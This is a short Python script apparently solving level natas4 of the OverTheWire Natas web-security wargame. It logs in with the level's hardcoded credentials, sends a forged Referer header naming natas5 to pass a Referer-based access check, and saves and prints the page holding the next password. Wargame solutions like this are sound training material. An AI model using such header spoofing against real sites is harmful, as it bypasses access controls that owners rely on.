#!/usr/bin/env python

import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

url = f'http://{username}.natas.labs.overthewire.org/'

# response = requests.get(url, auth=(username, password))
response = requests.get(url, auth=(username, password), headers=headers)
content = response.text
output = open('output.html', 'w')
output.write(content)

print(content)
# print(re.findall('The password for natas5 is(.*)', content))

# HTTP Headers & Cookies
